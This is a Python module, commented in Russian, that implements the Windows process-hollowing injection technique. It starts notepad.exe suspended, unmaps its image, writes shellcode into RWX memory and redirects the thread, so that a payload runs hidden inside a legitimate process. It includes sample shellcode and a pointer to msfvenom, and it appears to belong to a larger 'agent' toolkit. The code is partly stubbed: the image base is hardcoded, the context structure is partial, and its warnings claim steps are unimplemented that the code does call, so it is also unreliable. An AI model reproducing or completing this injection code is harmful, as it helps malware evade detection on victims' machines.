#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
Модуль Process Hollowing - Техника внедрения кода
--------------------------------------------------
Запускает легитимный процесс в приостановленном состоянии,
вырезает его оригинальный код из памяти, внедряет 
указанный payload и возобновляет выполнение.
Позволяет маскировать выполнение под легитимный процесс.

Источник идеи: secret_dev_notes.md

ВНИМАНИЕ: Требует соответствующих прав (обычно администратора
или прав уровня SYSTEM для работы с некоторыми процессами).
Использование может быть незаконным без разрешения.
"""

import os
import platform
import ctypes
import logging
import sys
from typing import Optional, Tuple

# TODO: Интегрировать с основной системой логирования агента
logger = logging.getLogger("ProcessHollowing")
logging.basicConfig(level=logging.INFO)

# --- Константы и структуры для Windows --- 
# Определяем их только на Windows, чтобы избежать AttributeError на других ОС
if platform.system() == "Windows":
    from ctypes.wintypes import (
        HANDLE, BOOL, DWORD, LPWSTR, WORD, LPBYTE, LONG, ULONG, USHORT, LPVOID, 
        ULARGE_INTEGER, LARGE_INTEGER, LPDWORD, PDWORD, PVOID
    )
    
    # --- Константы --- 
    CREATE_SUSPENDED = 0x00000004
    MEM_COMMIT = 0x1000
    MEM_RESERVE = 0x2000
    PAGE_EXECUTE_READWRITE = 0x40
    PROCESS_ALL_ACCESS = 0x1F0FFF # Не всегда нужно, можно использовать более ограниченные права
    PROCESS_VM_OPERATION = 0x0008
    PROCESS_VM_READ = 0x0010
    PROCESS_VM_WRITE = 0x0020
    THREAD_ALL_ACCESS = 0x1F03FF
    THREAD_GET_CONTEXT = 0x0008
    THREAD_SET_CONTEXT = 0x0010
    THREAD_SUSPEND_RESUME = 0x0002
    CONTEXT_FULL = 0x10007 # Для x86
    CONTEXT_AMD64 = 0x100000 | 0x0000010 | 0x0000002 | 0x0000001 # CONTEXT_CONTROL | CONTEXT_INTEGER | CONTEXT_SEGMENTS
    
    # --- Структуры --- 
    class STARTUPINFO(ctypes.Structure):
        _fields_ = [("cb", DWORD),
                    ("lpReserved", LPWSTR),
                    ("lpDesktop", LPWSTR),
                    ("lpTitle", LPWSTR),
                    ("dwX", DWORD),
                    ("dwY", DWORD),
                    ("dwXSize", DWORD),
                    ("dwYSize", DWORD),
                    ("dwXCountChars", DWORD),
                    ("dwYCountChars", DWORD),
                    ('dwFillAttribute', DWORD),
                    ("dwFlags", DWORD),
                    ("wShowWindow", WORD),
                    ("cbReserved2", WORD),
                    ("lpReserved2", LPBYTE),
                    ("hStdInput", HANDLE),
                    ("hStdOutput", HANDLE),
                    ("hStdError", HANDLE)]

    class PROCESS_INFORMATION(ctypes.Structure):
        _fields_ = [("hProcess", HANDLE),
                    ("hThread", HANDLE),
                    ("dwProcessId", DWORD),
                    ("dwThreadId", DWORD)]
                    
    # Структура для GetThreadContext (x64)
    # Определяем только необходимые поля для изменения точки входа (Rcx)
    # Полная структура очень велика
    if platform.machine().endswith('64'):
        # Используем упрощенную структуру, содержащую только Rcx
        class CONTEXT_AMD64_PARTIAL(ctypes.Structure):
             _fields_ = [("Rcx", ctypes.c_ulonglong)] # DWORD64 не всегда есть, используем c_ulonglong
        # TODO: Добавить остальные поля или использовать правильную полную структуру CONTEXT
        CONTEXT = CONTEXT_AMD64_PARTIAL # Упрощенное имя
    else: # x86
        # Используем упрощенную структуру, содержащую только Eax
        class CONTEXT_X86_PARTIAL(ctypes.Structure):
             _fields_ = [("Eax", DWORD)] # Точка входа для x86 обычно в Eax
        # TODO: Добавить остальные поля или использовать правильную полную структуру CONTEXT
        CONTEXT = CONTEXT_X86_PARTIAL # Упрощенное имя
         
    # Определяем указатель на контекст
    LPCONTEXT = ctypes.POINTER(CONTEXT)
    
    # Необходимые типы из PEB (для получения ImageBaseAddress)
    # Определяем только то, что нужно, чтобы избежать ошибок импорта
    class PEB_LDR_DATA(ctypes.Structure):
        _fields_ = [("Reserved1", LPBYTE * 8),
                    ("Reserved2", PVOID * 3),
                    ("InMemoryOrderModuleList", PVOID)] # LIST_ENTRY

    class LDR_DATA_TABLE_ENTRY(ctypes.Structure):
         _fields_ = [("Reserved1", PVOID * 2),
                     ("InMemoryOrderLinks", PVOID), # LIST_ENTRY
                     ("Reserved2", PVOID * 2),
                     ("DllBase", PVOID),
                     ("EntryPoint", PVOID),
                     ("Reserved3", PVOID),
                     ("FullDllName", PVOID), # UNICODE_STRING
                     ("Reserved4", BYTE * 8),
                     ("Reserved5", PVOID * 3),
                     ("Reserved6", PVOID), # HASH_ENTRY
                     ("TimeDateStamp", ULONG)]
                     
    class PEB(ctypes.Structure):
         _fields_ = [("Reserved1", LPBYTE * 2),
                     ("BeingDebugged", BYTE),
                     ("Reserved2", LPBYTE * 1),
                     ("Reserved3", PVOID * 2),
                     ("Ldr", POINTER(PEB_LDR_DATA)),
                     ("ProcessParameters", PVOID), # PRTL_USER_PROCESS_PARAMETERS
                     ("Reserved4", PVOID * 3),
                     ("AtlThunkSListPtr", PVOID),
                     ("Reserved5", PVOID),
                     ("Reserved6", ULONG),
                     ("Reserved7", PVOID),
                     ("Reserved8", ULONG),
                     ("AtlThunkSListPtr32", ULONG),
                     ("Reserved9", PVOID * 45),
                     ("Reserved10", BYTE * 96),
                     ("PostProcessInitRoutine", PVOID),
                     ("Reserved11", BYTE * 128),
                     ('Reserved12', PVOID * 1),
                     ("SessionId", ULONG)]
                     
    # Функция NtQueryInformationProcess (из ntdll)
    ProcessBasicInformation = 0
    class PROCESS_BASIC_INFORMATION(ctypes.Structure):
        _fields_ = [("Reserved1", PVOID),
                    ("PebBaseAddress", ctypes.POINTER(PEB)),
                    ("Reserved2", PVOID * 2),
                    ("UniqueProcessId", PVOID), # ULONG_PTR
                    ("Reserved3", PVOID)]

# --- Основная функция --- 

def hollow_process(target_path: str, payload_bytes: bytes) -> bool:
    """
    Выполняет Process Hollowing.
    
    Args:
        target_path (str): Путь к легитимному исполняемому файлу-жертве.
        payload_bytes (bytes): Байты шеллкода/PE-файла для внедрения.
        
    Returns:
        bool: True в случае успеха, False в случае ошибки.
    """
    if platform.system() != "Windows":
        logger.error("Process Hollowing возможен только на Windows.")
        return False
        
    logger.info(f"Запуск Process Hollowing для '{target_path}'...")
    
    # Инициализация структур
    startup_info = STARTUPINFO()
    process_info = PROCESS_INFORMATION()
    startup_info.cb = ctypes.sizeof(startup_info)
    
    # Получаем указатели на функции API
    try:
        kernel32 = ctypes.WinDLL('kernel32', use_last_error=True)
        CreateProcessW = kernel32.CreateProcessW
        # Другие функции будем получать по мере необходимости
    except (OSError, AttributeError) as e:
        logger.error(f"Не удалось загрузить kernel32.dll или найти CreateProcessW: {e}")
        return False

    # Шаг 1: CreateProcessW
    logger.debug(f"Создание процесса '{target_path}' в приостановленном состоянии...")
    creation_flags = CREATE_SUSPENDED
    try:
        success = CreateProcessW(
            ctypes.c_wchar_p(target_path), # lpApplicationName
            None,                       # lpCommandLine (можно указать, если нужно)
            None,                       # lpProcessAttributes
            None,                       # lpThreadAttributes
            False,                      # bInheritHandles
            creation_flags,             # dwCreationFlags
            None,                       # lpEnvironment
            None,                       # lpCurrentDirectory
            ctypes.byref(startup_info), # lpStartupInfo
            ctypes.byref(process_info)  # lpProcessInformation
        )
        
        if not success:
            error_code = ctypes.get_last_error()
            logger.error(f"CreateProcessW не удался. Ошибка: {error_code}")
            return False
            
        logger.info(f"Процесс-жертва успешно создан (PID: {process_info.dwProcessId}, TID: {process_info.dwThreadId})")
        h_process = process_info.hProcess
        h_thread = process_info.hThread
        
    except Exception as e:
        logger.error(f"Исключение при вызове CreateProcessW: {e}")
        return False

    # --- Дальнейшие шаги --- 
    image_base_address = None
    payload_base_address = None
    
    # --- Вспомогательные функции (определены здесь, т.к. используют типы Windows) --- 
    
    def get_image_base_address(h_process_local: HANDLE) -> Optional[int]:
        """Получает базовый адрес образа процесса из его PEB."""
        nonlocal kernel32 # Используем kernel32 из внешней области видимости
        try:
            ntdll = ctypes.WinDLL('ntdll')
            NtQueryInformationProcess = ntdll.NtQueryInformationProcess
        except (OSError, AttributeError) as e:
            logger.error(f"Не удалось загрузить ntdll или найти NtQueryInformationProcess: {e}")
            return None
            
        pbi = PROCESS_BASIC_INFORMATION()
        return_length = ULONG(0)
        
        try:
            status = NtQueryInformationProcess(h_process_local, ProcessBasicInformation, ctypes.byref(pbi), ctypes.sizeof(pbi), ctypes.byref(return_length))
            if status != 0: logger.error(f"NtQueryInformationProcess status: {status:#x}"); return None
            if not pbi.PebBaseAddress: logger.error("PebBaseAddress is NULL."); return None
            
            # ЗАГЛУШКА: Чтение PEB и извлечение ImageBaseAddress
            logger.warning("Чтение PEB и извлечение ImageBaseAddress НЕ РЕАЛИЗОВАНЫ полностью (заглушка). Используем 0x400000.")
            image_base = 0x400000 
            logger.debug(f"Получен базовый адрес образа (заглушка): {image_base:#x}")
            return image_base
        except Exception as e:
            logger.error(f"Исключение при получении базового адреса образа: {e}")
            return None

    def unmap_view(h_process_local: HANDLE, image_base_local: int) -> bool:
        """Выполняет NtUnmapViewOfSection."""
        try:
            ntdll = ctypes.WinDLL('ntdll')
            NtUnmapViewOfSection = ntdll.NtUnmapViewOfSection
            status = NtUnmapViewOfSection(h_process_local, image_base_local)
            if status != 0: logger.error(f"NtUnmapViewOfSection status: {status:#x}"); return False
            logger.info("Оригинальный образ успешно выгружен (unmapped).")
            return True
        except Exception as e:
            logger.error(f"Исключение при вызове NtUnmapViewOfSection: {e}")
            return False

    def virtual_alloc(h_process_local: HANDLE, preferred_address_local: int, size_local: int) -> Optional[int]:
        """Выполняет VirtualAllocEx."""
        nonlocal kernel32
        try:
            VirtualAllocEx = kernel32.VirtualAllocEx
            mem_address = VirtualAllocEx(h_process_local, preferred_address_local, size_local, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE)
            if not mem_address:
                logger.warning(f"Не удалось выделить память по адресу {preferred_address_local:#x}. Пробуем в любом месте...")
                mem_address = VirtualAllocEx(h_process_local, None, size_local, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE)
                if not mem_address: logger.error(f"VirtualAllocEx failed. Error: {ctypes.get_last_error()}"); return None
            logger.info(f"Память успешно выделена по адресу: {mem_address:#x}")
            return mem_address
        except Exception as e:
            logger.error(f"Исключение при вызове VirtualAllocEx: {e}")
            return None

    def write_memory(h_process_local: HANDLE, address_local: int, data_local: bytes) -> bool:
        """Записывает данные в память."""
        nonlocal kernel32
        try:
            WriteProcessMemory = kernel32.WriteProcessMemory
            data_size = len(data_local)
            buffer = ctypes.c_char_p(data_local)
            bytes_written = DWORD(0)
            success = WriteProcessMemory(h_process_local, address_local, buffer, data_size, ctypes.byref(bytes_written))
            if not success: logger.error(f"WriteProcessMemory failed. Error: {ctypes.get_last_error()}"); return False
            if bytes_written.value != data_size: logger.error(f"WriteProcessMemory wrote {bytes_written.value}/{data_size} bytes."); return False
            logger.info(f"Успешно записано {bytes_written.value} байт по адресу {address_local:#x}.")
            return True
        except Exception as e:
            logger.error(f"Исключение при вызове WriteProcessMemory: {e}")
            return False

    def modify_thread_context(h_thread_local: HANDLE, new_entry_point_local: int) -> bool:
        """Изменяет контекст потока."""
        nonlocal kernel32
        try:
            GetThreadContext = kernel32.GetThreadContext
            SetThreadContext = kernel32.SetThreadContext
            context_flags = CONTEXT_AMD64 if platform.machine().endswith('64') else CONTEXT_FULL
            context = CONTEXT()
            context.ContextFlags = context_flags
            success = GetThreadContext(h_thread_local, ctypes.byref(context))
            if not success: logger.error(f"GetThreadContext failed. Error: {ctypes.get_last_error()}"); return False
            if platform.machine().endswith('64'): context.Rcx = new_entry_point_local
            else: context.Eax = new_entry_point_local
            success = SetThreadContext(h_thread_local, ctypes.byref(context))
            if not success: logger.error(f"SetThreadContext failed. Error: {ctypes.get_last_error()}"); return False
            logger.info("Контекст потока успешно изменен.")
            return True
        except Exception as e:
            logger.error(f"Исключение при работе с контекстом потока: {e}")
            return False

    def resume_thread(h_thread_local: HANDLE) -> bool:
        """Возобновляет поток."""
        nonlocal kernel32
        try:
            ResumeThread = kernel32.ResumeThread
            previous_suspend_count = ResumeThread(h_thread_local)
            if previous_suspend_count == -1: logger.error(f"ResumeThread failed. Error: {ctypes.get_last_error()}"); return False
            logger.info(f"Поток {h_thread_local} успешно возобновлен (prev count: {previous_suspend_count}).")
            return True
        except Exception as e:
            logger.error(f"Исключение при вызове ResumeThread: {e}")
            return False
            
    try:
        # TODO: Шаг 2: Получить ImageBaseAddress из PEB процесса pi.hProcess
        logger.warning("Получение ImageBaseAddress НЕ РЕАЛИЗОВАНО.")
        image_base_address = get_image_base_address(h_process)
        if not image_base_address:
             # Ошибка уже залогирована внутри get_image_base_address
             return False 

        # TODO: Шаг 3: NtUnmapViewOfSection(pi.hProcess, ImageBaseAddress)
        logger.warning("NtUnmapViewOfSection НЕ РЕАЛИЗОВАНА.")
        unmap_success = unmap_view(h_process, image_base_address)
        if not unmap_success:
             return False

        # TODO: Шаг 4: VirtualAllocEx
        logger.warning("VirtualAllocEx НЕ РЕАЛИЗОВАНА.")
        payload_base_address = virtual_alloc(h_process, image_base_address, len(payload_bytes))
        if not payload_base_address:
            return False

        # TODO: Шаг 5: WriteProcessMemory
        logger.warning("WriteProcessMemory НЕ РЕАЛИЗОВАНА.")
        write_success = write_memory(h_process, payload_base_address, payload_bytes)
        if not write_success:
             return False

        # TODO: Шаг 6, 7, 8: GetThreadContext, Изменить точку входа, SetThreadContext
        logger.warning("Изменение точки входа НЕ РЕАЛИЗОВАНО.")
        context_success = modify_thread_context(h_thread, payload_base_address)
        if not context_success:
            return False

        # TODO: Шаг 9: ResumeThread
        logger.warning("ResumeThread НЕ РЕАЛИЗОВАНА.")
        resume_success = resume_thread(h_thread)
        if not resume_success:
             return False
        
        logger.info("Process Hollowing структурно завершен (с заглушками!).")
        return True # Пока возвращаем True, если CreateProcess прошел
        
    finally:
        # Шаг 10: CloseHandle
        if h_thread:
            kernel32.CloseHandle(h_thread)
        if h_process:
            kernel32.CloseHandle(h_process)
        logger.debug("Хендлы процесса и потока закрыты.")

    # logger.warning("Логика Process Hollowing НЕ РЕАЛИЗОВАНА (заглушка).")
    # return False # Пока заглушка

# Пример использования (для отладки на Windows)
if __name__ == "__main__":
    if platform.system() == "Windows":
        logger.setLevel(logging.DEBUG)
        
        # Пример payload (простой MessageBox)
        # TODO: Сгенерировать реальный шеллкод (например, через msfvenom)
        # Этот шеллкод для x64 MessageBox "Hello" "World"
        shellcode = (
            b"\x48\x83\xEC\x28\x48\x83\xE4\xF0\x48\x8B\x15\x41\x00\x00\x00"
            b"\x48\x8B\x0D\x42\x00\x00\x00\x48\x83\xC1\x10\xE8\x46\x00\x00\x00"
            b"\x48\x31\xC9\x48\x31\xD2\x4D\x31\xC0\x4D\x31\xC9\x48\x8D\x0D\x14"
            b"\x00\x00\x00\x48\x8D\x15\x1B\x00\x00\x00\xFF\xD0\x48\x83\xC4\x28"
            b"\xC3\x48\x65\x6C\x6C\x6F\x00\x57\x6F\x72\x6C\x64\x00\x55\x73\x65"
            b"\x72\x33\x32\x2E\x64\x6C\x6C\x00\x4D\x65\x73\x73\x61\x67\x65\x42"
            b"\x6F\x78\x57\x00"
        )
        
        target = "C:\\Windows\\System32\\notepad.exe"
        if not os.path.exists(target):
            logger.error(f"Целевой файл не найден: {target}")
        else:
            success = hollow_process(target, shellcode)
            if success:
                print("Process Hollowing успешно выполнен (предположительно).")
            else:
                print("Ошибка выполнения Process Hollowing.")
    else:
        print("Этот пример предназначен только для Windows.") 